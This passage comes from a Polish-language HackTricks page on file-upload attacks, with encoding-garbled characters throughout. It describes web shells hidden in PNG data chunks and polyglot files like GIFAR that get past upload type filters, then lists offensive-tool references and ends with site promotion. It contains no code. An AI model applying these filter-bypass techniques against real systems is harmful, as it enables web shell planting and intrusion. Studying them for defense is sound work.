SzczegÃ³Å‚owe omÃ³wienie tej techniki, w tym jej metodologia i potencjalne zastosowania, znajduje siÄ™ w nastÄ™pujÄ…cym artykule: ["Kodowanie powÅ‚ok internetowych w kawaÅ‚kach PNG IDAT"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). To ÅºrÃ³dÅ‚o oferuje kompleksowe zrozumienie procesu i jego implikacji.

WiÄ™cej informacji w: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Pliki poliglotowe

Pliki poliglotowe sÅ‚uÅ¼Ä… jako unikalne narzÄ™dzie w cyberbezpieczeÅ„stwie, dziaÅ‚ajÄ…c jak kameleony, ktÃ³re mogÄ… jednoczeÅ›nie istnieÄ‡ w wielu formatach plikÃ³w. InteresujÄ…cym przykÅ‚adem jest [GIFAR](https://en.wikipedia.org/wiki/Gifar), hybryda, ktÃ³ra dziaÅ‚a zarÃ³wno jako GIF, jak i archiwum RAR. Takie pliki nie ograniczajÄ… siÄ™ do tej pary; kombinacje takie jak GIF i JS lub PPT i JS sÄ… rÃ³wnieÅ¼ moÅ¼liwe.

Podstawowa uÅ¼ytecznoÅ›Ä‡ plikÃ³w poliglotowych polega na ich zdolnoÅ›ci do omijania Å›rodkÃ³w bezpieczeÅ„stwa, ktÃ³re filtrujÄ… pliki na podstawie typu. PowszechnÄ… praktykÄ… w rÃ³Å¼nych aplikacjach jest zezwalanie tylko na okreÅ›lone typy plikÃ³w do przesyÅ‚aniaâ€”takie jak JPEG, GIF lub DOCâ€”aby zminimalizowaÄ‡ ryzyko zwiÄ…zane z potencjalnie szkodliwymi formatami (np. JS, PHP lub pliki Phar). Jednak plik poliglotowy, dostosowujÄ…c siÄ™ do kryteriÃ³w strukturalnych wielu typÃ³w plikÃ³w, moÅ¼e dyskretnie omijaÄ‡ te ograniczenia.

Mimo swojej elastycznoÅ›ci, pliki poliglotowe napotykajÄ… ograniczenia. Na przykÅ‚ad, podczas gdy plik poliglotowy moÅ¼e jednoczeÅ›nie zawieraÄ‡ plik PHAR (PHp ARchive) i JPEG, sukces jego przesyÅ‚ania moÅ¼e zaleÅ¼eÄ‡ od polityki rozszerzeÅ„ plikÃ³w platformy. JeÅ›li system jest rygorystyczny w kwestii dozwolonych rozszerzeÅ„, sama strukturalna dualnoÅ›Ä‡ pliku poliglotowego moÅ¼e nie wystarczyÄ‡, aby zapewniÄ‡ jego przesÅ‚anie.

WiÄ™cej informacji w: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Referencje

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
